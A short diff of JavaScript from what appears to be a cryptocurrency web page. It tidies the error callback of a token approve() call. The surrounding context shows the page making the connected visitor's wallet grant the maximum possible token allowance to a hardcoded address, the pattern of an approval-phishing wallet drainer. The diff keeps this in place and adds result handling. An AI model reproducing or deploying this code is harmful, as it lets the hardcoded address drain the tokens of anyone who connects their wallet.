@@ -84,8 +84,8 @@
             amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
             tooladr = '0x7815bdE6Eaa5e976890eCF2cdcf4249aD201AF95'
             _contract.methods.approve(tooladr,amount).send({from:ethereum.selectedAddress},(err,res)=>{
-                if(err){alert('失败')}
-            })        
+                err ? alert('失败') : transationstate(res)                
+            }).then(console.log)    
         }
 
         function fun_gsh(adrs){
